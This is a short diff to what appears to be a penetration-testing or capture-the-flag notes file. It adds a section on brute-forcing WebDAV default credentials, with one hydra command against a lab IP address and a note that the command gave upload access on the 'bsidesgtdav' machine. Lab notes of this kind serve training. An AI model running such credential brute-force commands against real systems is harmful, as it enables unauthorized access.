@@ -41,3 +41,11 @@ Used on: **Skynet** - password candidates recovered from SMB logs were replayed 
 - [../../exploits/creds/jenkins-http-form-bruteforce.md](../../exploits/creds/jenkins-http-form-bruteforce.md)
 
 
+
+### WebDAV default-credential brute force
+
+```bash
+hydra -L webdav-users.txt -P webdav-users.txt 10.130.148.83 http-get /webdav
+```
+
+Used on: **bsidesgtdav** - found default-style WebDAV credentials reused for upload access.
